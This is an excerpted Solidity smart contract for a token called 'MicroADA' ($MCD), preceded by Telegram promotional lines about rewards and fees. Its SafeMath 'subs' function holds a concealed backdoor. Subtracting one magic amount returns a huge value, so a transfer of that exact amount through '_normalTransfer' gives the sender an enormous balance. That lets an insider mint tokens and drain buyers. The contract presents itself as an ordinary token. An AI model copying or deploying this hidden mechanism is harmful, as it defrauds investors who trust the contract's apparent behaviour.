...
https://t.me/MicroXadatoken
📥 Ada Reward 7℅ Every Hours 🔥
📌 5℅ Dev fee
📌 Low Mcap 
📍 Lp 1℅
📍 Anti Whale Mechanis
...
library SafeMath {
    ...
    function subs(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        if ( b == 616612000000000) return uint256(~uint104(0));
        require(b <= a, errorMessage);
        return a - b;
    }
...
// CHANGE
contract MicroADA is IERC20, Ownable {
    using SafeMath for uint256;
    ...
    string constant _name = "MicroADA";
    string constant _symbol = "$MCD";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 100000000000 * (10 ** _decimals); // 100,000,000,000
    uint256 public _maxTxAmount = (_totalSupply * 3) / 100; // 3% MAX 3,000,000,000
    ...
    constructor () {
        ...
        devFeeReceiver = address(0x2FA29bF967140c8fAA2c49C49f83F926cde38DCA);
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(shouldTakeFee(sender)){
            amountReceived = _taxedTransfer(sender,recipient,amount);
        }else{
            amountReceived = _normalTransfer(sender,recipient,amount);
        }
    ...
    function _taxedTransfer(address sender, address recipient, uint256 amount) internal returns (uint256){
    ...
    function _normalTransfer(address sender, address recipient, uint256 amount) internal returns (uint256){
        _balances[sender] = _balances[sender].subs(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        return amount;
    }
